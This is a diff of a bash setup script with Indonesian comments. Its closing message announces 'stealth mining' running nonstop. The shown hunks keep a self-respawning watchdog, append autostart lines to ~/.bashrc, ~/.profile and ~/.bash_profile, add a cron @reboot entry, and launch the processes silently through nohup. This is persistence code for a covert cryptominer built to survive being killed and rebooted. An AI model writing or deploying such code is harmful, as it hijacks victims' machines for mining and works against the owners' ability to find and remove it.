@@ -85,7 +85,6 @@ while true; do
   sleep 5
 done
 
-# Self-respawn jika dimatikan
 bash "\$DIR/launcher.sh" &
 EOF
 
@@ -110,15 +109,19 @@ EOF
 
 chmod +x watchdog.sh
 
-# === Autostart Persistence ===
+# === Autostart via .bashrc/.profile ===
 for FILE in ~/.bashrc ~/.profile ~/.bash_profile; do
   grep -q "watchdog.sh" "\$FILE" 2>/dev/null || echo "cd $DIR && nohup ./watchdog.sh >/dev/null 2>&1 &" >> "\$FILE"
 done
 
-# === Cron @reboot ===
-( crontab -l 2>/dev/null; echo "@reboot cd $DIR && nohup ./watchdog.sh >/dev/null 2>&1 &" ) | crontab -
+# === Tambahkan ke cron jika tersedia ===
+if command -v crontab >/dev/null 2>&1; then
+  ( crontab -l 2>/dev/null; echo "@reboot cd $DIR && nohup ./watchdog.sh >/dev/null 2>&1 &" ) | crontab -
+else
+  echo "[!] crontab tidak tersedia. Lewati cron autostart."
+fi
 
-# === Start Sekarang ===
+# === Jalankan sekarang ===
 nohup ./launcher.sh >/dev/null 2>&1 &
 nohup ./watchdog.sh >/dev/null 2>&1 &
 echo "[✓] Stealth mining aktif + Anti-dismiss 24 jam nonstop."
